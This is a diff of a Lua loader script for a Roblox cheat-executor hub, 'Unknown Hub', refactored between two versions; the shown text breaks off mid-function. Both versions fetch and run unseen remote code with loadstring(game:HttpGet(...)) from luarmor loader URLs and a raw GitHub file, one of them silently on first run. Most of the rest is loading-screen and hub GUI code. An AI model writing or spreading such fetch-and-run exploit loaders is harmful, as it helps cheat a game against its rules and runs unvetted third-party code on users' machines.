@@ -1,970 +1,716 @@
--- ═══════════════════════════════════════════════════════════════
--- UNKNOWN HUB - Final Working Fix
--- ═══════════════════════════════════════════════════════════════
+-- ═══════════════════════════════════════════════════════════
+-- UNKNOWN HUB - 100% FOOLPROOF VERSION
+-- ═══════════════════════════════════════════════════════════
 
 local function checkExecutor()
     local execName = "unknown"
-    if identifyexecutor then
-        execName = tostring(identifyexecutor())
-    elseif getexecutorname then
-        execName = tostring(getexecutorname())
-    end
-    return string.find(string.lower(execName), "xeno")
+    if identifyexecutor then execName = tostring(identifyexecutor())
+    elseif getexecutorname then execName = tostring(getexecutorname()) end
+    return string.find(string.lower(execName), "xeno") ~= nil
 end
 
 local FIRST_RUN_PATH = "unknown_firstrun.json"
-
-local function fileExistsGlobal(path)
-    return (isfile and pcall(isfile, path) and isfile(path)) or false
-end
-
+local function fileExistsGlobal(p) return (isfile and pcall(isfile, p) and isfile(p)) or false end
 local function checkFirstRun()
     if fileExistsGlobal(FIRST_RUN_PATH) then
         local ok, raw = pcall(readfile, FIRST_RUN_PATH)
         if ok and raw then
             local ok2, data = pcall(function() return game:GetService("HttpService"):JSONDecode(raw) end)
-            if ok2 and type(data) == "table" and data.__Done == true then
-                return true
-            end
+            if ok2 and type(data) == "table" and data.__Done == true then return true end
         end
     end
     return false
 end
-
 local function markFirstRunDone()
-    pcall(function()
-        local json = game:GetService("HttpService"):JSONEncode({ __Done = true })
-        writefile(FIRST_RUN_PATH, json)
-    end)
+    pcall(function() writefile(FIRST_RUN_PATH, game:GetService("HttpService"):JSONEncode({__Done = true})) end)
 end
 
 local needFirstRun = not checkFirstRun()
-if needFirstRun then
-    markFirstRunDone()
-end
+if needFirstRun then markFirstRunDone() end
 
 if checkExecutor() then
-    task.spawn(function()
-        loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/66e067f17cbfa177b7bed91c1bdcb466.lua"))()
-    end)
-    if needFirstRun then
-        task.delay(2, function()
-            pcall(function()
-                loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/4361856ec1a1756e11427e07dd6ec7bb.lua"))()
-            end)
-        end)
-    end
+    spawn(function() pcall(function() loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/66e067f17cbfa177b7bed91c1bdcb466.lua"))() end) end)
+    if needFirstRun then delay(2, function() pcall(function() loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/4361856ec1a1756e11427e07dd6ec7bb.lua"))() end) end) end
     return
 end
 
-local Players       = game:GetService("Players")
-local TweenService  = game:GetService("TweenService")
-local HttpService   = game:GetService("HttpService")
-local CoreGui       = game:GetService("CoreGui")
-local RunService    = game:GetService("RunService")
+-- ═══════════════════════════════════════════════════════════
+-- SERVICES & SETUP
+-- ═══════════════════════════════════════════════════════════
+local Players = game:GetService("Players")
+local TweenService = game:GetService("TweenService")
+local HttpService = game:GetService("HttpService")
+local CoreGui = game:GetService("CoreGui")
+local RunService = game:GetService("RunService")
 local UserInputService = game:GetService("UserInputService")
-local LocalPlayer   = Players.LocalPlayer
+local LocalPlayer = Players.LocalPlayer
 
-local function GetSafeGui()
-    if gethui then return gethui() end
-    if CoreGui then return CoreGui end
-    return LocalPlayer:FindFirstChildOfClass("PlayerGui") or LocalPlayer:WaitForChild("PlayerGui")
-end
-
-local playerGui = GetSafeGui()
+local playerGui = (gethui and gethui()) or CoreGui or LocalPlayer:WaitForChild("PlayerGui")
 
 local DISCORD_LINK = "https://discord.gg/unknown-hub"
 local REMOTE_URL = "https://raw.githubusercontent.com/tkhanhh/Spicy/refs/heads/main/loo"
 
-COLOR_BASE_BG       = COLOR_BASE_BG       or Color3.fromRGB(16, 24, 39)
-COLOR_CARD_GRAD_1   = COLOR_CARD_GRAD_1   or Color3.fromRGB(12, 18, 32)
-COLOR_CARD_GRAD_2   = COLOR_CARD_GRAD_2   or Color3.fromRGB(21, 30, 47)
-COLOR_CARD_GRAD_3   = COLOR_CARD_GRAD_3   or Color3.fromRGB(10, 82, 120)
-COLOR_STROKE_GLOW   = COLOR_STROKE_GLOW   or Color3.fromRGB(56, 189, 248)
-COLOR_STROKE_MAIN   = COLOR_STROKE_MAIN   or Color3.fromRGB(56, 189, 248)
-COLOR_SURFACE       = COLOR_SURFACE       or Color3.fromRGB(30, 41, 59)
-COLOR_SURFACE_DARK  = COLOR_SURFACE_DARK  or Color3.fromRGB(25, 32, 48)
-COLOR_TEAL_ON       = COLOR_TEAL_ON       or Color3.fromRGB(52, 180, 230)
-COLOR_TEXT          = COLOR_TEXT          or Color3.fromRGB(241, 245, 249)
-COLOR_TEXT_MUTED    = COLOR_TEXT_MUTED    or Color3.fromRGB(148, 163, 184)
-COLOR_TOGGLE_OFF    = Color3.fromRGB(60, 70, 90)
-COLOR_HOVER         = Color3.fromRGB(35, 45, 65)
+local C_BG = Color3.fromRGB(16, 24, 39)
+local C_GRAD1 = Color3.fromRGB(12, 18, 32)
+local C_GRAD2 = Color3.fromRGB(21, 30, 47)
+local C_GRAD3 = Color3.fromRGB(10, 82, 120)
+local C_GLOW = Color3.fromRGB(56, 189, 248)
+local C_STROKE = Color3.fromRGB(56, 189, 248)
+local C_SURF = Color3.fromRGB(30, 41, 59)
+local C_SURFD = Color3.fromRGB(25, 32, 48)
+local C_TEAL = Color3.fromRGB(52, 180, 230)
+local C_TEXT = Color3.fromRGB(241, 245, 249)
+local C_MUTED = Color3.fromRGB(148, 163, 184)
+local C_TOFF = Color3.fromRGB(60, 70, 90)
+local C_HOV = Color3.fromRGB(35, 45, 65)
 
--- FIXED: Replaced broken smart-quotes with normal double-quotes
-local _makeCard = (type(makeCard) == "function") and makeCard or function(parent, sizeUDim2)
-    local frame = Instance.new("Frame")
-    frame.BackgroundColor3 = COLOR_BASE_BG
-    frame.BorderSizePixel = 0
-    frame.Size = sizeUDim2
-    frame.Parent = parent
-    local corner = Instance.new("UICorner")
-    corner.CornerRadius = UDim.new(0, 20)
-    corner.Parent = frame
-    local g = Instance.new("UIGradient")
-    g.Rotation = 35
-    g.Color = ColorSequence.new({
-        ColorSequenceKeypoint.new(0.00, COLOR_CARD_GRAD_1),
-        ColorSequenceKeypoint.new(0.55, COLOR_CARD_GRAD_2),
-        ColorSequenceKeypoint.new(1.00, COLOR_CARD_GRAD_3),
-    })
-    g.Parent = frame
-    local s1 = Instance.new("UIStroke")
-    s1.Thickness = 8
-    s1.Transparency = 0.90
-    s1.LineJoinMode = Enum.LineJoinMode.Round
-    s1.Color = COLOR_STROKE_GLOW
-    s1.Parent = frame
-    local s2 = Instance.new("UIStroke")
-    s2.Thickness = 2
-    s2.Transparency = 0.15
-    s2.LineJoinMode = Enum.LineJoinMode.Round
-    s2.Color = COLOR_STROKE_MAIN
-    s2.Parent = frame
-    return frame
-end
-
--- FIXED: Replaced broken smart-quotes with normal double-quotes
-local _makeTopBar = (type(makeTopBar) == "function") and makeTopBar or function(parent, titleText)
-    local bar = Instance.new("Frame")
-    bar.Parent = parent
-    bar.BackgroundColor3 = COLOR_SURFACE_DARK
-    bar.BackgroundTransparency = 0.15
-    bar.BorderSizePixel = 0
-    bar.Size = UDim2.new(1, -16, 0, 42)
-    bar.Position = UDim2.new(0, 8, 0, 8)
-    local barCorner = Instance.new("UICorner")
-    barCorner.CornerRadius = UDim.new(0, 14)
-    barCorner.Parent = bar
-    local lbl = Instance.new("TextLabel")
-    lbl.Parent = bar
-    lbl.BackgroundTransparency = 1
-    lbl.Position = UDim2.new(0, 14, 0, 0)
-    lbl.Size = UDim2.new(1, -80, 1, 0)
-    lbl.Font = Enum.Font.GothamBold
-    lbl.Text = titleText
-    lbl.TextXAlignment = Enum.TextXAlignment.Left
-    lbl.TextSize = 18
-    lbl.TextColor3 = COLOR_TEXT
-    local grad = Instance.new("UIGradient")
-    grad.Color = ColorSequence.new({
-        ColorSequenceKeypoint.new(0.00, Color3.fromRGB(34, 211, 238)),
-        ColorSequenceKeypoint.new(0.50, Color3.fromRGB(255, 255, 255)),
-        ColorSequenceKeypoint.new(1.00, Color3.fromRGB(99, 102, 241)),
-    })
-    grad.Parent = lbl
-    return bar
-end
-
+-- ═══════════════════════════════════════════════════════════
+-- CONFIG
+-- ═══════════════════════════════════════════════════════════
 config = config or {}
-local CONFIG_PATH = CONFIG_PATH or "unknown_config.json"
-
-local function fileExists(path)
-    return (isfile and pcall(isfile, path) and isfile(path)) or false
-end
-
-local function readText(path)
-    if not isfile then return nil end
-    local ok, data = pcall(readfile, path)
-    if ok then return data end
-    return nil
-end
-
-local function writeText(path, text)
-    if not writefile then return false end
-    return pcall(writefile, path, text)
-end
-
-local function loadConfigHard()
-    if fileExists(CONFIG_PATH) then
-        local raw = readText(CONFIG_PATH)
-        if raw then
-            local ok, decoded = pcall(function() return HttpService:JSONDecode(raw) end)
-            if ok and type(decoded) == "table" then
-                for k, v in pairs(decoded) do
-                    config[k] = v
-                end
-            end
+local CONFIG_PATH = "unknown_config.json"
+local function loadCfg()
+    if fileExistsGlobal(CONFIG_PATH) then
+        local ok, raw = pcall(readfile, CONFIG_PATH)
+        if ok and raw then
+            local ok2, d = pcall(function() return HttpService:JSONDecode(raw) end)
+            if ok2 and type(d) == "table" then for k, v in pairs(d) do config[k] = v end end
         end
     end
 end
-
-local function saveConfigHard()
-    if type(saveConfig) == "function" then
-        local ok = pcall(saveConfig)
-        if ok then return end
-    end
-    local ok, json = pcall(function() return HttpService:JSONEncode(config) end)
-    if ok then writeText(CONFIG_PATH, json) end
+local function saveCfg()
+    local ok, j = pcall(function() return HttpService:JSONEncode(config) end)
+    if ok then pcall(function() writefile(CONFIG_PATH, j) end) end
 end
-
-loadConfigHard()
+loadCfg()
 
 local firstShownFlag = (config.__UnknownHubDiscordShown == true)
 
-local function runRemote()
-    pcall(function()
-        local src = game:HttpGet(REMOTE_URL)
-        local f = loadstring(src)
-        if type(f) == "function" then f() end
-    end)
-end
-
-if firstShownFlag then
-    runRemote()
-    if needFirstRun then
-        task.delay(2, function()
-            pcall(function()
-                loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/4361856ec1a1756e11427e07dd6ec7bb.lua"))()
-            end)
-        end)
-    end
-else
-    config.__UnknownHubDiscordShown = true
-    saveConfigHard()
-    runRemote()
-    if needFirstRun then
-        task.delay(2, function()
-            pcall(function()
-                loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/4361856ec1a1756e11427e07dd6ec7bb.lua"))()
-            end)
-        end)
-    end
-end
-
--- ═══════════════════════════════════════════════════════════════
--- LOADING SCREEN
--- ═══════════════════════════════════════════════════════════════
-local loadingGui = Instance.new("ScreenGui")
-loadingGui.Name = "UnknownHubLoading"
-loadingGui.IgnoreGuiInset = true
-loadingGui.ResetOnSpawn = false
-loadingGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
-loadingGui.DisplayOrder = 9999
-loadingGui.Parent = playerGui
-
-local loadingOverlay = Instance.new("Frame")
-loadingOverlay.Name = "Overlay"
-loadingOverlay.Size = UDim2.fromScale(1, 1)
-loadingOverlay.BackgroundColor3 = COLOR_BASE_BG
-loadingOverlay.BorderSizePixel = 0
-loadingOverlay.Parent = loadingGui
-
-local particles = {}
-for i = 1, 25 do
-    local p = Instance.new("Frame")
-    p.Size = UDim2.fromOffset(math.random(2, 5), math.random(2, 5))
-    p.BackgroundColor3 = COLOR_STROKE_GLOW
-    p.BackgroundTransparency = math.random(60, 85) / 100
-    p.Position = UDim2.fromScale(math.random(100)/100, math.random(100)/100)
-    p.Rotation = math.random(0, 360)
-    p.Parent = loadingOverlay
-    local pCorner = Instance.new("UICorner")
-    pCorner.CornerRadius = UDim.new(0, 2)
-    pCorner.Parent = p
-    table.insert(particles, {
-        instance = p,
-        speedX = math.random(-80, 80) / 1000,
-        speedY = math.random(-80, 80) / 1000,
-        rotSpeed = math.random(-150, 150) / 100
-    })
-end
-
-local logoFrame = Instance.new("Frame")
-logoFrame.Size = UDim2.fromOffset(90, 90)
-logoFrame.Position = UDim2.new(0.5, 0, 0.35, 0)
-logoFrame.AnchorPoint = Vector2.new(0.5, 0)
-logoFrame.BackgroundColor3 = COLOR_SURFACE_DARK
-logoFrame.BorderSizePixel = 0
-logoFrame.Parent = loadingOverlay
-local logoCorner = Instance.new("UICorner")
-logoCorner.CornerRadius = UDim.new(0, 45)
-logoCorner.Parent = logoFrame
-local logoStroke = Instance.new("UIStroke")
-logoStroke.Parent = logoFrame
-logoStroke.Thickness = 2
-logoStroke.Transparency = 0.2
-logoStroke.Color = COLOR_STROKE_MAIN
-
-local logoLabel = Instance.new("TextLabel")
-logoLabel.Size = UDim2.fromScale(1, 1)
-logoLabel.BackgroundTransparency = 1
-logoLabel.Text = "UH"
-logoLabel.Font = Enum.Font.GothamBlack
-logoLabel.TextSize = 32
-logoLabel.TextColor3 = COLOR_TEAL_ON
-logoLabel.Parent = logoFrame
-
-local loadingTitle = Instance.new("TextLabel")
-loadingTitle.Size = UDim2.new(0, 400, 0, 40)
-loadingTitle.Position = UDim2.new(0.5, 0, 0.55, 0)
-loadingTitle.AnchorPoint = Vector2.new(0.5, 0)
-loadingTitle.BackgroundTransparency = 1
-loadingTitle.Text = "UNKNOWN HUB"
-loadingTitle.Font = Enum.Font.GothamBlack
-loadingTitle.TextSize = 28
-loadingTitle.TextColor3 = COLOR_TEXT
-loadingTitle.Parent = loadingOverlay
-local titleGrad = Instance.new("UIGradient")
-titleGrad.Parent = loadingTitle
-titleGrad.Color = ColorSequence.new({
-    ColorSequenceKeypoint.new(0.00, Color3.fromRGB(34, 211, 238)),
-    ColorSequenceKeypoint.new(0.50, Color3.fromRGB(255, 255, 255)),
-    ColorSequenceKeypoint.new(1.00, Color3.fromRGB(99, 102, 241)),
-})
-
-local loadingSub = Instance.new("TextLabel")
-loadingSub.Size = UDim2.new(0, 300, 0, 20)
-loadingSub.Position = UDim2.new(0.5, 0, 0.62, 0)
-loadingSub.AnchorPoint = Vector2.new(0.5, 0)
-loadingSub.BackgroundTransparency = 1
-loadingSub.Text = "Loading modules..."
-loadingSub.Font = Enum.Font.Gotham
-loadingSub.TextSize = 14
-loadingSub.TextColor3 = COLOR_TEXT_MUTED
-loadingSub.Parent = loadingOverlay
-
-local progressBg = Instance.new("Frame")
-progressBg.Size = UDim2.new(0, 300, 0, 6)
-progressBg.Position = UDim2.new(0.5, -150, 0.68, 0)
-progressBg.BackgroundColor3 = COLOR_SURFACE_DARK
-progressBg.BorderSizePixel = 0
-progressBg.Parent = loadingOverlay
-local progressBgCorner = Instance.new("UICorner")
-progressBgCorner.CornerRadius = UDim.new(0, 3)
-progressBgCorner.Parent = progressBg
-
-local progressFill = Instance.new("Frame")
-progressFill.Size = UDim2.fromScale(0, 1)
-progressFill.BackgroundColor3 = COLOR_TEAL_ON
-progressFill.BorderSizePixel = 0
-progressFill.Parent = progressBg
-local progressFillCorner = Instance.new("UICorner")
-progressFillCorner.CornerRadius = UDim.new(0, 3)
-progressFillCorner.Parent = progressFill
-
-local statusLabel = Instance.new("TextLabel")
-statusLabel.Size = UDim2.new(0, 300, 0, 16)
-statusLabel.Position = UDim2.new(0.5, -150, 0.74, 0)
-statusLabel.BackgroundTransparency = 1
-statusLabel.Text = "Initializing..."
-statusLabel.Font = Enum.Font.Gotham
-statusLabel.TextSize = 12
-statusLabel.TextColor3 = COLOR_TEXT_MUTED
-statusLabel.Parent = loadingOverlay
-
-local versionLabel = Instance.new("TextLabel")
-versionLabel.Size = UDim2.new(0, 300, 0, 16)
-versionLabel.Position = UDim2.new(0.5, -150, 0.92, 0)
-versionLabel.BackgroundTransparency = 1
-versionLabel.Font = Enum.Font.Gotham
-versionLabel.TextSize = 11
-versionLabel.TextColor3 = COLOR_TEXT_MUTED
-versionLabel.Parent = loadingOverlay
-
-local execDisplay = "Unknown"
 pcall(function()
-    if identifyexecutor then execDisplay = tostring(identifyexecutor())
-    elseif getexecutorname then execDisplay = tostring(getexecutorname()) end
-end)
-versionLabel.Text = "v1.0.0 | " .. execDisplay
-
-local loadingDestroyed = false
-local loadingConn = RunService.Heartbeat:Connect(function(dt)
-    if loadingDestroyed then return end
-    for _, particle in ipairs(particles) do
-        if particle.instance and particle.instance.Parent then
-            local pos = particle.instance.Position
-            particle.instance.Position = UDim2.new(
-                math.clamp(pos.X.Scale + particle.speedX * dt, 0, 1), 0,
-                math.clamp(pos.Y.Scale + particle.speedY * dt, 0, 1), 0
-            )
-            particle.instance.Rotation = particle.instance.Rotation + particle.rotSpeed * dt
-            if pos.X.Scale < -0.05 then particle.instance.Position = UDim2.new(1.05, 0, pos.Y.Scale, 0) end
-            if pos.X.Scale > 1.05 then particle.instance.Position = UDim2.new(-0.05, 0, pos.Y.Scale, 0) end
-            if pos.Y.Scale < -0.05 then particle.instance.Position = UDim2.new(pos.X.Scale, 0, 1.05, 0) end
-            if pos.Y.Scale > 1.05 then particle.instance.Position = UDim2.new(pos.X.Scale, 0, -0.05, 0) end
-        end
-    end
+    local src = game:HttpGet(REMOTE_URL)
+    local f = loadstring(src)
+    if type(f) == "function" then f() end
 end)
 
-local function DestroyLoading()
-    if loadingDestroyed then return end
-    loadingDestroyed = true
-    if loadingConn then
-        pcall(function() loadingConn:Disconnect() end)
-        loadingConn = nil
-    end
-    pcall(function() loadingGui.Enabled = false end)
-    pcall(function() loadingGui:Destroy() end)
-    loadingGui = nil
-    loadingOverlay = nil
+if not firstShownFlag then
+    config.__UnknownHubDiscordShown = true
+    saveCfg()
 end
 
--- ═══════════════════════════════════════════════════════════════
--- MAIN HUB GUI (Built immediately, hidden until loading finishes)
--- ═══════════════════════════════════════════════════════════════
+if needFirstRun then
+    delay(2, function() pcall(function() loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/4361856ec1a1756e11427e07dd6ec7bb.lua"))() end) end)
+end
+
+-- ═══════════════════════════════════════════════════════════
+-- HELPER FUNCTIONS
+-- ═══════════════════════════════════════════════════════════
+local function mkCorner(parent, r)
+    local c = Instance.new("UICorner")
+    c.CornerRadius = UDim.new(0, r or 8)
+    c.Parent = parent
+    return c
+end
+
+local function mkStroke(parent, color, thick, trans)
+    local s = Instance.new("UIStroke")
+    s.Color = color or C_STROKE
+    s.Thickness = thick or 1
+    s.Transparency = trans or 0
+    s.Parent = parent
+    return s
+end
+
+local function mkGrad(parent, rot, c1, c2, c3)
+    local g = Instance.new("UIGradient")
+    g.Rotation = rot or 0
+    g.Color = ColorSequence.new({
+        ColorSequenceKeypoint.new(0, c1 or C_GRAD1),
+        ColorSequenceKeypoint.new(0.5, c2 or C_GRAD2),
+        ColorSequenceKeypoint.new(1, c3 or C_GRAD3),
+    })
+    g.Parent = parent
+    return g
+end
+
+local function mkCard(parent, size)
+    local f = Instance.new("Frame")
+    f.BackgroundColor3 = C_BG
+    f.BorderSizePixel = 0
+    f.Size = size
+    f.Parent = parent
+    mkCorner(f, 20)
+    mkGrad(f, 35, C_GRAD1, C_GRAD2, C_GRAD3)
+    mkStroke(f, C_GLOW, 8, 0.9)
+    mkStroke(f, C_STROKE, 2, 0.15)
+    return f
+end
+
+local function mkTopBar(parent, text)
+    local f = Instance.new("Frame")
+    f.BackgroundColor3 = C_SURFD
+    f.BackgroundTransparency = 0.15
+    f.BorderSizePixel = 0
+    f.Size = UDim2.new(1, -16, 0, 42)
+    f.Position = UDim2.new(0, 8, 0, 8)
+    f.Parent = parent
+    mkCorner(f, 14)
+    local l = Instance.new("TextLabel")
+    l.BackgroundTransparency = 1
+    l.Position = UDim2.new(0, 14, 0, 0)
+    l.Size = UDim2.new(1, -80, 1, 0)
+    l.Font = Enum.Font.GothamBold
+    l.Text = text
+    l.TextXAlignment = Enum.TextXAlignment.Left
+    l.TextSize = 18
+    l.TextColor3 = C_TEXT
+    l.Parent = f
+    mkGrad(l, 0, Color3.fromRGB(34, 211, 238), Color3.fromRGB(255, 255, 255), Color3.fromRGB(99, 102, 241))
+    return f
+end
+
+local function clip(text)
+    if setclipboard then pcall(setclipboard, text) return true end
+    if toclipboard then pcall(toclipboard, text) return true end
+    if syn and syn.write_clipboard then pcall(syn.write_clipboard, text) return true end
+    return false
+end
+
+-- ═══════════════════════════════════════════════════════════
+-- LOADING SCREEN (SIMPLE & GUARANTEED)
+-- ═══════════════════════════════════════════════════════════
+local loadGui = Instance.new("ScreenGui")
+loadGui.Name = "UHLoading"
+loadGui.IgnoreGuiInset = true
+loadGui.ResetOnSpawn = false
+loadGui.DisplayOrder = 9999
+loadGui.Parent = playerGui
+
+local loadBg = Instance.new("Frame")
+loadBg.Size = UDim2.new(1, 0, 1, 0)
+loadBg.BackgroundColor3 = C_BG
+loadBg.BorderSizePixel = 0
+loadBg.Parent = loadGui
+
+local loadLogo = Instance.new("Frame")
+loadLogo.Size = UDim2.new(0, 80, 0, 80)
+loadLogo.Position = UDim2.new(0.5, -40, 0.4, 0)
+loadLogo.BackgroundColor3 = C_SURFD
+loadBg.BorderSizePixel = 0
+loadLogo.Parent = loadBg
+mkCorner(loadLogo, 40)
+mkStroke(loadLogo, C_STROKE, 2, 0.3)
+
+local loadLogoTxt = Instance.new("TextLabel")
+loadLogoTxt.Size = UDim2.new(1, 0, 1, 0)
+loadLogoTxt.BackgroundTransparency = 1
+loadLogoTxt.Text = "UH"
+loadLogoTxt.Font = Enum.Font.GothamBlack
+loadLogoTxt.TextSize = 28
+loadLogoTxt.TextColor3 = C_TEAL
+loadLogoTxt.Parent = loadLogo
+
+local loadTitle = Instance.new("TextLabel")
+loadTitle.Size = UDim2.new(0, 300, 0, 35)
+loadTitle.Position = UDim2.new(0.5, -150, 0.56, 0)
+loadTitle.BackgroundTransparency = 1
+loadTitle.Text = "UNKNOWN HUB"
+loadTitle.Font = Enum.Font.GothamBlack
+loadTitle.TextSize = 26
+loadTitle.TextColor3 = C_TEXT
+loadTitle.Parent = loadBg
+mkGrad(loadTitle, 0, Color3.fromRGB(34, 211, 238), Color3.fromRGB(255, 255, 255), Color3.fromRGB(99, 102, 241))
+
+local loadStatus = Instance.new("TextLabel")
+loadStatus.Size = UDim2.new(0, 300, 0, 20)
+loadStatus.Position = UDim2.new(0.5, -150, 0.63, 0)
+loadStatus.BackgroundTransparency = 1
+loadStatus.Text = "Initializing..."
+loadStatus.Font = Enum.Font.Gotham
+loadStatus.TextSize = 13
+loadStatus.TextColor3 = C_MUTED
+loadStatus.Parent = loadBg
+
+local loadBarBg = Instance.new("Frame")
+loadBarBg.Size = UDim2.new(0, 250, 0, 5)
+loadBarBg.Position = UDim2.new(0.5, -125, 0.7, 0)
+loadBarBg.BackgroundColor3 = C_SURFD
+loadBarBg.BorderSizePixel = 0
+loadBarBg.Parent = loadBg
+mkCorner(loadBarBg, 3)
+
+local loadBarFill = Instance.new("Frame")
+loadBarFill.Size = UDim2.new(0, 0, 0, 5)
+loadBarFill.BackgroundColor3 = C_TEAL
+loadBarFill.BorderSizePixel = 0
+loadBarFill.Position = UDim2.new(0, 0, 0, 0)
+loadBarFill.Parent = loadBarBg
+mkCorner(loadBarFill, 3)
+
+local loadPct = Instance.new("TextLabel")
+loadPct.Size = UDim2.new(0, 250, 0, 16)
+loadPct.Position = UDim2.new(0.5, -125, 0.75, 0)
+loadPct.BackgroundTransparency = 1
+loadPct.Text = "0%"
+loadPct.Font = Enum.Font.Gotham
+loadPct.TextSize = 11
+loadPct.TextColor3 = C_MUTED
+loadPct.Parent = loadBg
+
+-- ═══════════════════════════════════════════════════════════
+-- MAIN HUB GUI (Created immediately, hidden)
+-- ═══════════════════════════════════════════════════════════
 local hubGui = Instance.new("ScreenGui")
 hubGui.Name = "UnknownHub"
 hubGui.IgnoreGuiInset = true
 hubGui.ResetOnSpawn = false
-hubGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
 hubGui.Parent = playerGui
 
-local hubMain = _makeCard(hubGui, UDim2.fromOffset(220, 380))
-hubMain.AnchorPoint = Vector2.new(1, 0.5)
-hubMain.Position = UDim2.new(1, -20, 0.5, 0)
+local hubMain = mkCard(hubGui, UDim2.new(0, 220, 0, 380))
+hubMain.Position = UDim2.new(1, -240, 0.5, -190)
 hubMain.Visible = false
 
-local hubTop = _makeTopBar(hubMain, "Unknown Hub")
+local hubTop = mkTopBar(hubMain, "Unknown Hub")
 
-local hubCloseBtn = Instance.new("TextButton")
-hubCloseBtn.Parent = hubTop
-hubCloseBtn.BackgroundColor3 = COLOR_SURFACE
-hubCloseBtn.AutoButtonColor = true
-hubCloseBtn.BorderSizePixel = 0
-hubCloseBtn.Text = "X"
-hubCloseBtn.Font = Enum.Font.GothamBold
-hubCloseBtn.TextSize = 12
-hubCloseBtn.TextColor3 = COLOR_TEXT
-hubCloseBtn.Size = UDim2.fromOffset(24, 24)
-hubCloseBtn.Position = UDim2.new(1, -32, 0.5, -12)
-local hubCloseBtnCorner = Instance.new("UICorner")
-hubCloseBtnCorner.CornerRadius = UDim.new(0, 6)
-hubCloseBtnCorner.Parent = hubCloseBtn
+local hubClose = Instance.new("TextButton")
+hubClose.Size = UDim2.new(0, 24, 0, 24)
+hubClose.Position = UDim2.new(1, -32, 0.5, -12)
+hubClose.BackgroundColor3 = C_SURF
+hubClose.Text = "X"
+hubClose.Font = Enum.Font.GothamBold
+hubClose.TextSize = 12
+hubClose.TextColor3 = C_TEXT
+hubClose.BorderSizePixel = 0
+hubClose.AutoButtonColor = true
+hubClose.Parent = hubTop
+mkCorner(hubClose, 6)
 
-local hubMinBtn = Instance.new("TextButton")
-hubMinBtn.Parent = hubTop
-hubMinBtn.BackgroundColor3 = COLOR_SURFACE
-hubMinBtn.AutoButtonColor = true
-hubMinBtn.BorderSizePixel = 0
-hubMinBtn.Text = "—"
-hubMinBtn.Font = Enum.Font.GothamBold
-hubMinBtn.TextSize = 14
-hubMinBtn.TextColor3 = COLOR_TEXT
-hubMinBtn.Size = UDim2.fromOffset(24, 24)
-hubMinBtn.Position = UDim2.new(1, -60, 0.5, -12)
-local hubMinBtnCorner = Instance.new("UICorner")
-hubMinBtnCorner.CornerRadius = UDim.new(0, 6)
-hubMinBtnCorner.Parent = hubMinBtn
+local hubMin = Instance.new("TextButton")
+hubMin.Size = UDim2.new(0, 24, 0, 24)
+hubMin.Position = UDim2.new(1, -60, 0.5, -12)
+hubMin.BackgroundColor3 = C_SURF
+hubMin.Text = "-"
+hubMin.Font = Enum.Font.GothamBold
+hubMin.TextSize = 14
+hubMin.TextColor3 = C_TEXT
+hubMin.BorderSizePixel = 0
+hubMin.AutoButtonColor = true
+hubMin.Parent = hubTop
+mkCorner(hubMin, 6)
 
-local contentScroll = Instance.new("ScrollingFrame")
-contentScroll.Name = "Content"
-contentScroll.Parent = hubMain
-contentScroll.Size = UDim2.new(1, -16, 1, -60)
-contentScroll.Position = UDim2.new(0, 8, 0, 54)
-contentScroll.BackgroundTransparency = 1
-contentScroll.ScrollBarThickness = 3
-contentScroll.ScrollBarImageColor3 = COLOR_STROKE_MAIN
-contentScroll.BorderSizePixel = 0
-contentScroll.CanvasSize = UDim2.fromScale(0, 0)
-contentScroll.AutomaticCanvasSize = Enum.AutomaticSize.Y
+local hubScroll = Instance.new("ScrollingFrame")
+hubScroll.Size = UDim2.new(1, -16, 1, -60)
+hubScroll.Position = UDim2.new(0, 8, 0, 54)
+hubScroll.BackgroundTransparency = 1
+hubScroll.ScrollBarThickness = 3
+hubScroll.ScrollBarImageColor3 = C_STROKE
+hubScroll.BorderSizePixel = 0
+hubScroll.AutomaticCanvasSize = Enum.AutomaticSize.Y
+hubScroll.Parent = hubMain
 
-local contentLayout = Instance.new("UIListLayout")
-contentLayout.Parent = contentScroll
-contentLayout.Padding = UDim.new(0, 6)
-contentLayout.SortOrder = Enum.SortOrder.LayoutOrder
-contentLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
+local hubList = Instance.new("UIListLayout")
+hubList.Padding = UDim.new(0, 5)
+hubList.SortOrder = Enum.SortOrder.LayoutOrder
+hubList.HorizontalAlignment = Enum.HorizontalAlignment.Center
+hubList.Parent = hubScroll
 
-local contentPadding = Instance.new("UIPadding")
-contentPadding.Parent = contentScroll
-contentPadding.PaddingTop = UDim.new(0, 4)
-contentPadding.PaddingBottom = UDim.new(0, 4)
+local hubPad = Instance.new("UIPadding")
+hubPad.PaddingTop = UDim.new(0, 4)
+hubPad.PaddingBottom = UDim.new(0, 4)
+hubPad.Parent = hubScroll
 
-local hubVisible = false
-local hubMinimized = false
+local hubOpen = false
 
-local function ToggleHub()
-    if hubMinimized then hubMinimized = false end
-    hubVisible = not hubVisible
-    hubMain.Visible = hubVisible
+local function toggleHub()
+    hubOpen = not hubOpen
+    hubMain.Visible = hubOpen
 end
 
-local function MinimizeHub()
-    hubMinimized = true
-    hubVisible = false
+local function closeHub()
+    hubOpen = false
     hubMain.Visible = false
 end
 
-hubCloseBtn.MouseButton1Click:Connect(MinimizeHub)
-hubMinBtn.MouseButton1Click:Connect(MinimizeHub)
+hubClose.MouseButton1Click:Connect(closeHub)
+hubMin.MouseButton1Click:Connect(closeHub)
 
-UserInputService.InputBegan:Connect(function(input, processed)
-    if processed then return end
-    if input.KeyCode == Enum.KeyCode.RightShift then
-        ToggleHub()
+UserInputService.InputBegan:Connect(function(inp, proc)
+    if proc then return end
+    if inp.KeyCode == Enum.KeyCode.RightShift then toggleHub() end
+end)
+
+local drag, dragS, dragP
+hubTop.InputBegan:Connect(function(inp)
+    if inp.UserInputType == Enum.UserInputType.MouseButton1 or inp.UserInputType == Enum.UserInputType.Touch then
+        drag = true dragS = inp.Position dragP = hubMain.Position
+        inp.Changed:Connect(function() if inp.UserInputState == Enum.UserInputState.End then drag = false end end)
+    end
+end)
+UserInputService.InputChanged:Connect(function(inp)
